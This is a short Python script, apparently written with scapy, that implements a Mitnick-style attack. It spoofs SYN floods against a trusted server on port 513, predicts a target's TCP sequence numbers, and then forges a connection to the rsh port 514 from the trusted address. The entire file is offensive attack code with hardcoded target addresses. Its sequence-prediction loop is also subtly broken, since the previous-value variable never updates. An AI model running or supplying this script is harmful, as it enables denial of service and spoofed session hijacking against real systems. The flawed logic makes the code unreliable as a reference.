from scapy.layers.inet import IP, TCP
from scapy.all import send, sr1, Packet

def synFlood(source: str, target: str) -> None:
    for sourcePort in range(1024, 65535):
        IPLayer = IP(src=source, dst=target)
        TCPLayer = TCP(sport=sourcePort, dport=513)
        pkt = IPLayer / TCPLayer
        send(pkt)

def callTSN(target: str) -> int:
    seqNum: int = 0
    preNum: int = 0
    diffSeq: int = 0
    for _ in range(1, 5):
        if preNum != 0:
            preNum = seqNum
        pkt: Packet = IP(dst=target) / TCP()
        ans: Packet = sr1(pkt, verbose= 0)
        seqNum = ans.getlayer(TCP).seq
        diffSeq = seqNum - preNum
        print(f"[+] TCP Seq Difference: {str(diffSeq)}")
    return seqNum + diffSeq

def spoofConn(source: str, target: str, ack: int) -> None:
    IPLayer = IP(src=source, dst=target)
    TCPLayer = TCP(sport=513, dport=514)
    synPkt: Packet = IPLayer / TCPLayer
    send(synPkt)
    IPLayer = IP(src=source, dst=target)
    TCPLayer = TCP(sport=513, dport=514, ack=ack)
    ackPkt = IPLayer / TCPLayer
    send(ackPkt)

def main() -> None:
    source: str = "10.1.1.2"
    target: str = "192.168.1.3"
    print("[+] Starting SYN Flood to suppress remote server.")
    synFlood(source=source, target=target)

    target: str = "192.168.1.106"
    print("[+] Calculating correct TCP Sequence Number.")
    seqNum: int = callTSN(target=target)
    
    print("[+] Spoofing Connection.")
    spoofConn(source=source, target=target, ack=seqNum)
    
    print("[+] Done!")

if __name__ == "__main__":
    main()
